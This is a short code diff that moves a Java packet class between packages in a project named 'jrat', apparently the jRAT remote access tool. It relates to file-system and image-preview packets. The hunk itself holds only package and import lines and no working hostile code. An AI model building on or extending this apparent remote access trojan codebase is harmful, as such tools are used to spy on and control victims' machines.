@@ -1,7 +1,7 @@
-package jrat.client.packets.incoming;
+package jrat.module.fs.packets;
 
 import jrat.client.Connection;
-import jrat.client.packets.outgoing.Packet43PreviewImage;
+import jrat.client.packets.incoming.AbstractIncomingPacket;
 
 import javax.imageio.ImageIO;
 import java.awt.image.BufferedImage;
